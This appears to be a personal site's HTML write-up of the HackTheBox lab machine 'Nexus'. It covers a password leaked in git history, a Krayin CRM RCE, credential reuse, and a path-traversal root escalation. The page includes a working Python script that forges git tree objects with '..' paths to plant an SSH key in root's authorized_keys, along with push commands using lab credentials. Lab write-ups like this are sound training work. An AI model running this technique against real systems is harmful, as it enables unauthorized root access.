@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#030305"/>
+<title>Nexus - HTB Write Up | pumkin</title>
+<meta name="description" content="HackTheBox Nexus (Easy, Linux) full write up: leaked .env creds → Krayin CRM CVE-2026-38526 RCE → DB password reuse → gitea template-sync path traversal → root SSH key."/>
+<link rel="icon" href="../cat.png"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#030305;--panel-bg:rgba(255,255,255,.03);--border:rgba(255,255,255,.06);--rose:#a855f7;--rose-dim:rgba(168,85,247,.15);--emerald:#34d399;--emerald-dim:rgba(52,211,153,.1);--text:#fafafa;--muted:#9ca3af;--dim:#6b7280}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden;position:relative}
+body::before{content:'';position:fixed;inset:0;background:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:60px 60px;z-index:0;pointer-events:none}
+.cyber-grid{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.cyber-grid::before{content:'';position:absolute;width:100%;height:100%;background:radial-gradient(circle at 50% 0%,rgba(168,85,247,.08) 0%,transparent 50%),radial-gradient(circle at 80% 80%,rgba(52,211,153,.04) 0%,transparent 50%)}
+main{position:relative;z-index:1;min-height:100vh;width:100%;padding:2rem 1rem}
+@media(min-width:768px){main{padding:3rem 2rem}}
+.max-w{max-width:72rem;width:100%;margin:0 auto}
+.nav-row{display:flex;align-items:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}
+.back-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:.75rem;background:var(--panel-bg);border:1px solid var(--border);color:var(--muted);text-decoration:none;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:.1em;transition:all .3s ease}
+.back-btn:hover{color:#c084fc;border-color:rgba(168,85,247,.5)}
+.back-btn svg{transition:transform .3s ease}
+.back-btn:hover svg{transform:translateX(-4px)}
+.panel{background:#0a0b0f;border:1px solid var(--border);border-radius:1rem;position:relative;overflow:hidden}
+.writeup-body{padding:2rem;max-width:60rem;margin:0 auto}
+@media(min-width:768px){.writeup-body{padding:3rem}}
+.meta{color:var(--dim);font-size:.75rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem}
+h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-transform:uppercase;margin-bottom:1.5rem}
+@media(min-width:768px){h1{font-size:2.5rem}}
+.writeup-body h2{font-size:1.25rem;font-weight:700;color:#c084fc;margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}
+.writeup-body h3{font-size:1rem;font-weight:700;color:#34d399;margin:1.5rem 0 .75rem}
+.writeup-body p{color:var(--muted);font-size:.95rem;line-height:1.75;margin-bottom:1rem}
+.writeup-body ul,.writeup-body ol{color:var(--muted);font-size:.95rem;line-height:1.75;margin:0 0 1rem 1.25rem}
+.writeup-body li{margin-bottom:.25rem}
+.writeup-body strong{color:var(--text)}
+.writeup-body code{font-family:'JetBrains Mono','Fira Code',monospace;font-size:.85rem;background:rgba(168,85,247,.1);color:#c084fc;padding:2px 6px;border-radius:6px}
+.writeup-body pre{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:.75rem;padding:1rem;margin:1rem 0;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.8rem;color:var(--emerald);line-height:1.6;white-space:pre-wrap;word-wrap:break-word;overflow-wrap:anywhere}
+.writeup-body pre code{background:none;color:inherit;padding:0;border-radius:0}
+.section-tag{display:inline-block;padding:2px 10px;border-radius:9999px;font-size:.7rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase}
+.tag-easy{background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.3);color:#34d399}
+.tag-linux{background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.3);color:#34d399}
+.info-grid{display:grid;grid-template-columns:1fr;gap:.75rem;margin:1rem 0}
+@media(min-width:768px){.info-grid{grid-template-columns:repeat(3,1fr)}}
+.info-cell{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:.75rem;padding:1rem}
+.info-cell .lbl{color:var(--dim);font-size:.65rem;font-family:'JetBrains Mono','Fira Code',monospace;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.25rem}
+.info-cell .val{color:var(--text);font-size:.9rem;font-weight:600}
+.footer{text-align:center;padding-top:3rem;color:var(--dim);font-size:10px;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.15em;text-transform:uppercase}
+.fade-in{opacity:0;transform:translateY(20px);transition:opacity .6s ease,transform .6s ease}
+.fade-in.visible{opacity:1;transform:translateY(0)}
+</style>
+</head>
+<body>
+<div class="cyber-grid"></div>
+
+<main>
+<div class="max-w">
+  <div class="nav-row fade-in">
+    <a href="../writeups.html" class="back-btn">
+      <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+      Write Ups
+    </a>
+    <a href="../index.html" class="back-btn">Home</a>
+  </div>
+
+  <div class="panel fade-in">
+    <div class="writeup-body">
+
+      <p class="meta">hackthebox / easy / linux</p>
+      <h1>Nexus</h1>
+
+      <div class="info-grid">
+        <div class="info-cell"><div class="lbl">Platform</div><div class="val">HackTheBox</div></div>
+        <div class="info-cell"><div class="lbl">Difficulty</div><div class="val"><span class="section-tag tag-easy">Easy</span></div></div>
+        <div class="info-cell"><div class="lbl">OS</div><div class="val"><span class="section-tag tag-linux">Linux</span></div></div>
+      </div>
+
+      <h2>Summary</h2>
+      <p>Nexus is an easy Linux box built entirely on <strong>credential leaks and an unsanitized sync script</strong>. A public Gitea repo leaks a <code>.env</code> whose password unlocks a Krayin CRM login, which is then popped with <strong>CVE-2026-38526</strong> for a shell as <code>www-data</code>. A second, <em>different</em> database password in the app's own <code>.env</code> is reused by the <code>jones</code> system user. That account controls a Gitea template-sync timer that copies <code>git ls-tree</code> output through <code>os.path.join()</code> unsanitized - so a crafted repo with <code>../</code> tree paths plants our SSH key in <code>/root/.ssh/authorized_keys</code>, and we log in as root.</p>
+
+      <h2>Skills Required</h2>
+      <ul>
+        <li>Subdomain enumeration and vhost fuzzing</li>
+        <li>Reading git commit history for leaked secrets</li>
+        <li>Reusing credentials across accounts/services</li>
+      </ul>
+
+      <h2>Skills Learned</h2>
+      <ul>
+        <li>Exploiting a Krayin CRM RCE (CVE-2026-38526)</li>
+        <li>Writing raw git objects to bypass path checks and sneak <code>..</code> into trees</li>
+        <li>Abusing an unsanitized <code>os.path.join()</code> in a sync script for path traversal</li>
+        <li>Using the <code>Host</code> extraheader trick for vhost-matching git remotes</li>
+      </ul>
+
+      <h2>Enumeration</h2>
+      <p>The scan shows SSH and an nginx site that redirects to <code>nexus.htb</code>.</p>
+      <pre>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://nexus.htb/</pre>
+      <p>Vhost fuzzing finds two more hosts.</p>
+      <pre>ffuf -u http://nexus.htb -H 'Host: FUZZ.nexus.htb' ...
+
+git     [Status: 200, Size: 14474]
+billing [Status: 302, Size: 390]</pre>
+      <p>On the main site an email for the hiring manager is visible:</p>
+      <pre>j.matthew@nexus.htb</pre>
+      <p>Add both hosts to <code>/etc/hosts</code> and dig in.</p>
+
+      <h2>Foothold</h2>
+      <h3>Gitea leak → Krayin CRM</h3>
+      <p><code>git.nexus.htb</code> runs Gitea and hosts a repository containing a <code>.env</code> for the billing app. Scanning the commits turns up a password that was committed then <em>mostly</em> scrubbed:</p>
+      <pre>DB_PASSWORD=N27xh!!2ucY04</pre>
+      <p><code>billing.nexus.htb</code> is a <strong>Krayin CRM</strong>. The leaked password works for the email harvested from the main site (<code>j.matthew@nexus.htb</code>) - Krayin accepts it as a password login.</p>
+
+      <h3>Krayin RCE - CVE-2026-38526</h3>
+      <p>Krayin CRM has an authenticated RCE via <code>Krayin hashing</code> - the PoC ships an <code>exploit.py</code>.</p>
+      <pre>python exploit.py ...
+# shell as www-data</pre>
+
+      <h3>The other DB password</h3>
+      <p>Inside the box, <code>/var/www/krayin/.env</code> holds a <strong>different</strong> database password than the one from Gitea. Easy to skim past - don't.</p>
+      <pre>DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_DATABASE=krayin
+DB_USERNAME=krayin
+DB_PASSWORD=y27xb3ha!!74GbR</pre>
+      <p>The users table only has a bcrypt hash for <code>james</code> that won't crack, and the password doesn't work for that login. But the box has two home directories:</p>
+      <pre>ls /home
+git  jones</pre>
+      <p>The password works for the <code>jones</code> system user instead:</p>
+      <pre>ssh jones@nexus.htb</pre>
+
+      <h2>Privilege Escalation</h2>
+      <h3>The template-sync timer</h3>
+      <p>Checking timers reveals a root-ish automation:</p>
+      <pre>systemctl list-timers
+gitea-template-sync.timer   gitea-template-sync.service</pre>
+      <p>Reading <code>/etc/gitea/template-sync.py</code>: it clones every repo flagged as a <em>template</em> and syncs its contents to <code>/home/git/template-staging/&lt;owner&gt;/&lt;repo&gt;/</code>. The flaw: it builds paths from <code>git ls-tree</code> output with <code>os.path.join()</code> and no traversal sanitization. If we get a repo with <code>../</code> in tree paths to be synced, the copy target escapes the staging dir.</p>
+
+      <h3>Writing raw git objects</h3>
+      <p>Git's own <code>verify_path()</code> refuses to create files with <code>..</code> in the path, so a normal checkout can't do this. Instead we write raw objects straight into <code>.git/objects/</code>, building trees whose paths walk <code>../../../../root/.ssh/</code> and land an <code>authorized_keys</code>.</p>
+      <p>Generate a key and craft the repo with a builder script:</p>
+      <pre>ssh-keygen -t ed25519 -f /tmp/.k -N ''</pre>
+      <pre>#!/usr/bin/env python3
+import hashlib,zlib,os,subprocess,sys,time
+
+def write_obj(data,t):
+    h=("%s %d"%(t,len(data))).encode()+b"\x00"
+    s=h+data
+    sha=hashlib.sha1(s).hexdigest()
+    d=os.path.join(".git","objects",sha[:2])
+    os.makedirs(d,exist_ok=True)
+    p=os.path.join(d,sha[2:])
+    if not os.path.exists(p):
+        open(p,"wb").write(zlib.compress(s))
+    return sha
+
+def entry(mode,name,sha):
+    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)
+
+if not os.path.isdir(".git"):
+    print("Run inside git repo");sys.exit(1)
+
+r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)
+if r.returncode!=0:
+    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''");sys.exit(1)
+key=r.stdout.strip()+"\n"
+
+blob=write_obj(key.encode(),"blob")
+readme=write_obj(b"# Template\n","blob")
+ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
+cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
+fir=write_obj(entry("40000","root",cur),"tree")
+for i in range(4):
+    fir=write_obj(entry("40000","..",fir),"tree")
+root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
+ts=int(time.time())
+c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
+sha=write_obj(c.encode(),"commit")
+os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
+open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
+print("Done: "+sha)</pre>
+
+      <h3>Host trick for the vhost</h3>
+      <p>The repo needs to exist under <code>jones</code>, but <code>git.nexus.htb</code> wouldn't resolve on our box. Point git at the IP while presenting the right <code>Host</code> header - nginx/Gitea match on the vhost, and basic auth rides in the <code>Authorization</code> header, so both work. To avoid repeating the flag every time, set it once:</p>
+      <pre>git config http."http://10.129.234.54".extraheader "Host: git.nexus.htb"
+git remote set-url origin http://jones:'y27xb3ha!!74GbR'@10.129.234.54/jones/rce.git
+git push -u origin main --force</pre>
+
+      <p>Build the malicious objects and push (force, since we write our own <code>main</code> ref):</p>
+      <pre>python3 /tmp/builder.py
+Done: 22f71915ed1a8521b0c55359e846ab9545655cc5
+
+git push -u origin main --force</pre>
+
+      <h3>Root shell</h3>
+      <p>Once the timer syncs the malicious tree, our key lands in <code>/root/.ssh/authorized_keys</code>.</p>
+      <pre>ssh -i /tmp/.k root@nexus.htb</pre>
+
+      <h2>Key Takeaways</h2>
+      <ul>
+        <li><strong>Every .env is different</strong> - the DB password from Gitea and the one on disk were distinct; one opened the CRM, the other the machine.</li>
+        <li><strong>Passwords get reused as system passwords too</strong> - try leaked DB creds against local users when the web login rejects them.</li>
+        <li><strong>Unsanitized <code>os.path.join()</code> is path traversal</strong> - any script copying git tree paths without validation is a root shell waiting to happen.</li>
+        <li><strong>Git object hashing bypasses <code>verify_path()</code></strong> - writing trees by hand with <code>..</code> components defeats the client-side checks.</li>
+        <li><strong>Vhost reachability ≠ DNS</strong> - the <code>Host</code> extraheader lets git talk to the IP while satisfying the vhost.</li>
+      </ul>
+
+    </div>
+  </div>
+
+  <p class="footer">pumkin / write ups</p>
+</div>
+</main>
+
+<script>
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.classList.add('visible');
+    }
+  });
+}, { threshold: 0 });
+
+document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
+</script>
+</body>
+</html>
